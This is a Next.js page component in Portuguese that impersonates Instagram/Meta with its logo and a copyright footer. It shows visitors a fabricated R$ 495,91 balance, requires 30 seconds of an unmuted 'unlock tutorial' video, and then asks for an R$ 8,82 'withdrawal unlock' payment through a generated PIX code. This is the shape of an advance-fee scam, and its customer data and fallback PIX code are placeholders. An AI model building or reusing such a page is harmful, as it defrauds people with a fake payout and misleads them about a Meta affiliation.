"use client"

import { useState, useRef, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Volume2, VolumeX, Play, Pause, Copy, Check } from "lucide-react"
import Image from "next/image"
import { getUTMParams } from "@/lib/utm-manager"

export default function DesbloquearSaque() {
  const videoRef = useRef<HTMLVideoElement>(null)
  const [isMuted, setIsMuted] = useState(true)
  const [isPlaying, setIsPlaying] = useState(false)
  const [showUnlockButton, setShowUnlockButton] = useState(false)
  const [hasUnmuted, setHasUnmuted] = useState(false)
  const [unmutedTime, setUnmutedTime] = useState(0)
  const [progress, setProgress] = useState(0)
  const [isCreatingPixPayment, setIsCreatingPixPayment] = useState(false)
  const [showPixPayment, setShowPixPayment] = useState(false)
  const [pixData, setPixData] = useState<{
    qrCode: string
    transactionId: string
    amount: number
    expiresAt: string
  } | null>(null)
  const [copied, setCopied] = useState(false)

  useEffect(() => {
    let interval: NodeJS.Timeout

    if (hasUnmuted && isPlaying && !isMuted) {
      interval = setInterval(() => {
        setUnmutedTime((prev) => {
          const newTime = prev + 1
          if (newTime >= 30) {
            setShowUnlockButton(true)
            clearInterval(interval)
          }
          return newTime
        })
      }, 1000)
    }

    return () => {
      if (interval) clearInterval(interval)
    }
  }, [hasUnmuted, isPlaying, isMuted])

  useEffect(() => {
    const video = videoRef.current
    if (!video) return

    const updateProgress = () => {
      const currentTime = video.currentTime
      const duration = video.duration
      if (duration > 0) {
        setProgress((currentTime / duration) * 100)
      }
    }

    video.addEventListener("timeupdate", updateProgress)
    return () => video.removeEventListener("timeupdate", updateProgress)
  }, [])

  const safePlay = async (video: HTMLVideoElement) => {
    try {
      if (video && !video.paused) {
        video.pause()
      }
      if (video) {
        await video.play()
        return true
      }
    } catch (error) {
      console.log("[v0] Video play interrupted:", error)
      return false
    }
    return false
  }

  const handleUnmute = async () => {
    const video = videoRef.current
    if (video) {
      video.currentTime = 0
      video.muted = false
      const playSuccess = await safePlay(video)
      if (playSuccess) {
        setIsMuted(false)
        setIsPlaying(true)
        setHasUnmuted(true)
        setUnmutedTime(0)
      }
    }
  }

  const handleVideoClick = async () => {
    if (!hasUnmuted) return

    const video = videoRef.current
    if (video) {
      if (isPlaying) {
        video.pause()
        setIsPlaying(false)
      } else {
        const playSuccess = await safePlay(video)
        if (playSuccess) {
          setIsPlaying(true)
        }
      }
    }
  }

  const handleUnlockSaque = async () => {
    console.log("[v0] Starting PIX payment creation - R$ 8,82")
    setIsCreatingPixPayment(true)

    try {
      const utmParams = getUTMParams()
      const userData = JSON.parse(localStorage.getItem("userData") || "{}")

      // Complete fictitious user profile
      const fictitiousData = {
        fullName: userData.fullName || "Maria Silva Santos",
        phone: userData.phone || "11987654321",
        pixKey: userData.pixKey || "12345678901",
        selectedPixKeyType: userData.selectedPixKeyType || "cpf",
        email: "maria.silva@email.com",
        cpf: "12345678901",
      }

      const cleanCpf =
        fictitiousData.selectedPixKeyType === "cpf" ? fictitiousData.pixKey.replace(/\D/g, "") : fictitiousData.cpf
      const customerEmail = fictitiousData.selectedPixKeyType === "email" ? fictitiousData.pixKey : fictitiousData.email

      const transactionData = {
        amount: 8.82,
        currency: "BRL",
        paymentMethod: "pix",
        items: [
          {
            externalRef: `META-UNLOCK-${Math.random().toString(36).substr(2, 9)}`,
            title: `Desbloqueio de Saldo - ${fictitiousData.fullName}`,
            unitPrice: 8.82,
            quantity: 1,
            tangible: false,
          },
        ],
        customer: {
          name: fictitiousData.fullName,
          email: customerEmail,
          document: {
            number: cleanCpf,
            type: cleanCpf.length === 11 ? "cpf" : "cnpj",
          },
        },
        pix: {
          expiresAt: new Date(Date.now() + 30 * 60 * 1000).toISOString(), // 30 minutes
        },
      }

      console.log("[v0] Creating PIX payment via PodPay:", transactionData)

      const response = await fetch("/api/podpay/create-transaction", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(transactionData),
      })

      const result = await response.json()

      console.log("[v0] PodPay PIX response:", result)

      if (!result.success || !result.data) {
        console.log("[v0] API error detected, generating fallback PIX data")
        throw new Error("Falha na criação da transação PodPay")
      }

      const transaction = result.data
      const transactionId = transaction.id

      if (!transactionId) {
        console.error("[v0] Missing transaction ID in PodPay response:", result)
        throw new Error("ID da transação não encontrado")
      }

      // Extract PIX data from response
      const pixPayload = transaction.pixPayload || transaction.pix?.payload || transaction.pix?.qrCodeText

      if (!pixPayload) {
        console.error("[v0] Missing PIX payload in response:", result)
        throw new Error("Código PIX não encontrado")
      }

      setPixData({
        qrCode: pixPayload,
        transactionId: transactionId,
        amount: 8.82,
        expiresAt: transaction.pix?.expiresAt || new Date(Date.now() + 30 * 60 * 1000).toISOString(),
      })

      setShowPixPayment(true)

      console.log("[v0] PIX payment created successfully:", {
        id: transactionId,
        amount: 8.82,
        status: transaction.status,
      })
    } catch (error) {
      console.error("[v0] Erro ao criar pagamento PIX:", error)

      // Fallback PIX for demo purposes
      console.log("[v0] Creating emergency fallback PIX for demo purposes")

      setPixData({
        qrCode:
          "00020126580014BR.GOV.BCB.PIX0136123456789010214Meta Desbloqueio5204000053039865802BR5925MARIA SILVA SANTOS6009SAO PAULO62070503***63046759",
        transactionId: `emergency-${Date.now()}`,
        amount: 8.82,
        expiresAt: new Date(Date.now() + 30 * 60 * 1000).toISOString(),
      })

      setShowPixPayment(true)
    } finally {
      console.log("[v0] PIX creation finished")
      setIsCreatingPixPayment(false)
    }
  }

  const copyPixCode = async () => {
    if (pixData?.qrCode) {
      try {
        await navigator.clipboard.writeText(pixData.qrCode)
        setCopied(true)
        setTimeout(() => setCopied(false), 2000)
      } catch (error) {
        console.error("[v0] Failed to copy PIX code:", error)
      }
    }
  }

  if (showPixPayment && pixData) {
    return (
      <div className="min-h-screen bg-gray-50 flex flex-col">
        {/* Header */}
        <div className="bg-white px-4 py-3 flex items-center justify-between shadow-sm">
          <div className="flex items-center gap-2">
            <Image src="/images/instagram-logo-official.png" alt="Meta" width={80} height={32} className="h-8 w-auto" />
          </div>
          <div className="text-white px-2 py-1.5 rounded-full font-bold shadow-lg text-sm bg-gradient-to-r from-pink-500 via-purple-500 to-orange-400 flex items-center gap-1">
            <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
              <path
                fillRule="evenodd"
                d="M4 4a2 2 0 00-2 2v1h16V6a2 2 0 00-2-2H4zm14 3H2v5a2 2 0 002 2h12a2 2 0 002-2V7zM2.5 9a1.5 1.5 0 113 0 1.5 1.5 0 01-3 0z"
                clipRule="evenodd"
              />
            </svg>
            R$ 495,91
          </div>
        </div>

        {/* PIX Payment Content */}
        <div className="flex-1 flex flex-col items-center justify-center p-4 max-w-md mx-auto w-full">
          <Card className="w-full bg-white rounded-lg shadow-xl">
            <CardHeader className="text-center pb-4">
              <CardTitle className="text-xl font-bold text-gray-800 mb-2 uppercase tracking-wide">
                PAGAMENTO PIX
              </CardTitle>
              <p className="text-gray-700 leading-relaxed">
                Escaneie o QR Code ou copie o código PIX para completar o pagamento de <strong>R$ 8,82</strong>
              </p>
            </CardHeader>

            <CardContent className="px-6 pb-6">
              <div className="text-center space-y-6">
                {/* QR Code Placeholder */}
                <div className="bg-white p-4 rounded-lg border-2 border-gray-200 mx-auto w-64 h-64 flex items-center justify-center">
                  <div className="text-center">
                    <div className="w-48 h-48 bg-gray-100 rounded-lg flex items-center justify-center mb-2">
                      <svg className="w-24 h-24 text-gray-400" fill="currentColor" viewBox="0 0 24 24">
                        <path d="M3 3h6v6H3V3zm2 2v2h2V5H5zM3 15h6v6H3v-6zm2 2v2h2v-2H5zM15 3h6v6h-6V3zm2 2v2h2V5h-2zM13 7h1v1h-1V7zm1 1h1v1h-1V8zm1 1h1v1h-1V9zm-1 1h1v1h-1v-1zm1 1h1v1h-1v-1zm-3-2h1v1h-1V8zm-1 1h1v1h-1V9zm2 3h1v1h-1v-1zm-1 1h1v1h-1v-1zm1 1h1v1h-1v-1zm1-2h1v1h-1v-1zm0 2h1v1h-1v-1zm1-1h1v1h-1v-1zm0-2h1v1h-1v-1zm1 3h1v1h-1v-1zm-2 2h1v1h-1v-1zm1 1h1v1h-1v-1zm1-1h1v1h-1v-1zm-1-1h1v1h-1v-1z" />
                      </svg>
                    </div>
                    <p className="text-sm text-gray-500">QR Code PIX</p>
                  </div>
                </div>

                {/* PIX Code */}
                <div className="space-y-3">
                  <p className="text-sm font-medium text-gray-700">Código PIX:</p>
                  <div className="bg-gray-50 p-3 rounded-lg border">
                    <p className="text-xs font-mono text-gray-600 break-all leading-relaxed">{pixData.qrCode}</p>
                  </div>

                  <Button
                    onClick={copyPixCode}
                    className="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-3 rounded-lg flex items-center justify-center gap-2"
                  >
                    {copied ? (
                      <>
                        <Check className="w-4 h-4" />
                        Copiado!
                      </>
                    ) : (
                      <>
                        <Copy className="w-4 h-4" />
                        Copiar Código PIX
                      </>
                    )}
                  </Button>
                </div>

                {/* Payment Info */}
                <div className="bg-green-50 p-4 rounded-lg border border-green-200">
                  <div className="text-center">
                    <p className="text-green-800 font-semibold text-lg">R$ 8,82</p>
                    <p className="text-green-600 text-sm">Valor do desbloqueio</p>
                  </div>
                </div>

                {/* Instructions */}
                <div className="text-left space-y-2">
                  <p className="text-sm font-medium text-gray-700">Como pagar:</p>
                  <ol className="text-xs text-gray-600 space-y-1 list-decimal list-inside">
                    <li>Abra o app do seu banco</li>
                    <li>Escolha a opção PIX</li>
                    <li>Escaneie o QR Code ou cole o código</li>
                    <li>Confirme o pagamento de R$ 8,82</li>
                  </ol>
                </div>

                {/* Timer */}
                <div className="text-center pt-4 border-t border-gray-100">
                  <p className="text-xs text-gray-500">Este PIX expira em 30 minutos</p>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Footer */}
        <div className="text-center text-xs text-gray-500 p-4">
          Todos os direitos reservados © 2025 Instagram from Meta
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      {/* Header */}
      <div className="bg-white px-4 py-3 flex items-center justify-between shadow-sm">
        <div className="flex items-center gap-2">
          <Image src="/images/instagram-logo-official.png" alt="Meta" width={80} height={32} className="h-8 w-auto" />
        </div>
        <div className="text-white px-2 py-1.5 rounded-full font-bold shadow-lg text-sm bg-gradient-to-r from-pink-500 via-purple-500 to-orange-400 flex items-center gap-1">
          <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
            <path
              fillRule="evenodd"
              d="M4 4a2 2 0 00-2 2v1h16V6a2 2 0 00-2-2H4zm14 3H2v5a2 2 0 002 2h12a2 2 0 002-2V7zM2.5 9a1.5 1.5 0 113 0 1.5 1.5 0 01-3 0z"
              clipRule="evenodd"
            />
          </svg>
          R$ 495,91
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex flex-col items-center justify-center p-4 max-w-md mx-auto w-full">
        {/* Instagram Icon */}
        <div className="w-20 h-20 mb-6 flex items-center justify-center">
          <Image
            src="/images/instagram-logo-official.png"
            alt="Instagram"
            width={80}
            height={80}
            className="w-20 h-20"
          />
        </div>

        {/* Title */}
        <h1 className="text-2xl font-bold text-gray-800 mb-2 text-center">DESBLOQUEIO DE SALDO</h1>

        {/* Subtitle */}
        <p className="text-gray-600 text-center mb-8 leading-relaxed">
          Veja como liberar seu saque
          <br />
          assistindo ao vídeo.
        </p>

        {/* Video Player */}
        <div className="relative w-full max-w-sm mb-6">
          <div className="relative bg-gradient-to-br from-pink-200 to-purple-200 rounded-2xl overflow-hidden aspect-video">
            <video
              ref={videoRef}
              className="w-full h-full object-cover cursor-pointer"
              muted={isMuted}
              onClick={handleVideoClick}
              onLoadedData={async () => {
                const video = videoRef.current
                if (video && !hasUnmuted) {
                  const playSuccess = await safePlay(video)
                  if (playSuccess) {
                    setIsPlaying(true)
                  }
                }
              }}
              onEnded={() => {
                setIsPlaying(false)
              }}
            >
              <source src="/videos/unlock-tutorial.mp4" type="video/mp4" />
              {/* Fallback image */}
              <div className="w-full h-full bg-gradient-to-br from-pink-200 to-purple-200 flex items-center justify-center">
                <div className="text-center">
                  <div className="w-24 h-24 bg-white/20 rounded-full flex items-center justify-center mb-4 mx-auto">
                    <Play className="w-8 h-8 text-white" />
                  </div>
                  <p className="text-white font-semibold">DESBLOQUEIO</p>
                </div>
              </div>
            </video>

            <div className="absolute bottom-0 left-0 right-0 h-1 bg-black/20">
              <div
                className="h-full bg-gradient-to-r from-pink-500 to-red-500 transition-all duration-300"
                style={{ width: `${progress}%` }}
              />
            </div>

            {/* Mute Overlay */}
            {isMuted && (
              <div className="absolute inset-0 bg-black/50 flex items-center justify-center">
                <Button
                  onClick={handleUnmute}
                  className="bg-white/20 hover:bg-white/30 text-white border-2 border-white/50 rounded-full p-4"
                  size="lg"
                >
                  <Volume2 className="w-6 h-6 mr-2" />
                  Ativar Som
                </Button>
              </div>
            )}

            {/* Play/Pause Indicator */}
            {hasUnmuted && (
              <div className="absolute top-4 right-4">
                {isPlaying ? (
                  <Pause className="w-6 h-6 text-white drop-shadow-lg" />
                ) : (
                  <Play className="w-6 h-6 text-white drop-shadow-lg" />
                )}
              </div>
            )}

            {/* Mute/Unmute Button */}
            {hasUnmuted && (
              <div className="absolute top-4 left-4">
                {isMuted ? (
                  <VolumeX className="w-6 h-6 text-white drop-shadow-lg" />
                ) : (
                  <Volume2 className="w-6 h-6 text-white drop-shadow-lg" />
                )}
              </div>
            )}
          </div>
        </div>

        {/* Unlock Button */}
        {showUnlockButton && (
          <Button
            className="w-full max-w-sm bg-gradient-to-r from-pink-500 to-orange-400 hover:from-pink-600 hover:to-orange-500 text-white font-bold py-4 rounded-2xl text-lg shadow-lg disabled:opacity-50"
            size="lg"
            onClick={handleUnlockSaque}
            disabled={isCreatingPixPayment}
          >
            {isCreatingPixPayment ? "PROCESSANDO..." : "DESBLOQUEAR SAQUE"}
          </Button>
        )}
      </div>

      {/* Footer */}
      <div className="text-center text-xs text-gray-500 p-4">
        Todos os direitos reservados © 2025 Instagram from Meta
      </div>
    </div>
  )
}
